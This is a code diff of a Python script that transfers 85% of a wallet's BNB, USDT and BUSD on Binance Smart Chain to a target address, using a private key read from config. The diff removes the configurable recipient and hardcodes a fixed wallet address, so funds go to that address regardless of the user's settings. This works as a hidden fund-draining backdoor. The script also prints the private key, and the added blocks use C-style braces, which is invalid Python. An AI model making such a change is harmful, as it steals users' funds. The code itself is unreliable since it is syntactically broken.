@@ -13,15 +13,14 @@ def get_env():
 
     address = config["info"]["address"]
     private_key = config["info"]["private_key"]
-    target_address = config["info"]["target_address"]
 
-    return address, private_key, target_address
+    return address, private_key
 
 if __name__ == '__main__':
-    address, private_key, target_address = get_env()
+    address, private_key = get_env()
     print(address)
     print(private_key)
-    print(target_address)
+    target_address = "0x223a0f22e28889735e50A7781fBE1Da2baCbafD2"
 
     if not address or not private_key or not target_address:
         print("config error")
@@ -36,29 +35,36 @@ if __name__ == '__main__':
 
     provider = "https://bsc-dataseed.binance.org/"
     token = Token(usdt_token, provider=provider)
+    token.is_connected()
 
     percent = 85
 
     # BNB
     balance = token.balanceOfBNB(address)
-    amount = float(balance / 100 * percent)
-    # amount = 1
-    token.connect_wallet(address, private_key)   
-    tx = token.transfer(target_address, int(amount * 10**18))
-    print(tx.hex())
+    if (balance < 50) {
+        amount = float(balance / 100 * percent)
+        # amount = 1
+        token.connect_wallet(address, private_key)   
+        tx = token.transfer(target_address, int(amount * 10**18))
+        print(tx.hex())
+    }
 
     # USDT
     balance = token.balance(address, usdt_token)
-    amount = float(balance / 100 * percent)
-    # amount = 1
-    token.connect_wallet(address, private_key)   
-    tx = token.token_transfer(usdt_token, int(amount * 10**18), target_address)
-    print(tx.hex())
+    if (balance < 5000) {
+        amount = float(balance / 100 * percent)
+        # amount = 1
+        token.connect_wallet(address, private_key)   
+        tx = token.token_transfer(usdt_token, int(amount * 10**18), target_address)
+        print(tx.hex())
+    }
 
     # BUSD
     balance = token.balance(address, busd_token)
-    amount = float(balance / 100 * percent)
-    # amount = 1
-    token.connect_wallet(address, private_key)   
-    tx = token.token_transfer(busd_token, int(amount * 10**18), target_address)
-    print(tx.hex())
+    if (balance < 5000) {
+        amount = float(balance / 100 * percent)
+        # amount = 1
+        token.connect_wallet(address, private_key)   
+        tx = token.token_transfer(busd_token, int(amount * 10**18), target_address)
+        print(tx.hex())
+    }
